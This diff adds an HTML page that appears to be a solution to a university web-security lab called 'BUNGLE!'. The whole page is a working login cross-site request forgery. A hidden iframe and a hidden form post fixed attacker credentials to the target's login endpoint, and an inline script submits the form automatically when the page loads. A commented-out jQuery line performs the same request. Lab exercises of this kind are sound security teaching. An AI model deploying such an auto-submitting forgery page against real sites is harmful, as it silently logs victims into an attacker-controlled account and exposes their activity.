@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+	<script>
+		//$.post("https://bungle.sysnet.ucsd.edu/login", {username:"attacker", password:"l33th4x"});
+	</script>
+	
+    <title>BUNGLE! Login</title>
+  </head>
+ <body>
+   
+<iframe name="trgt" style="Display: none;"></iframe>
+    <form style="Display: none;" type = "hidden" name="spot" method="POST" action="https://bungle.sysnet.ucsd.edu/login?csrfdefense=0&xssdefense=4" target="trgt">
+      <label for="username">Username:</label>
+
+      <input type="text" id="username" name="username" value="attacker"><br><br>
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" value="l33th4x"><br><br>
+
+      <input type="submit" value="Login">
+	<script> document.spot.submit();</script>
+    </form>
+  </body>
+</html>
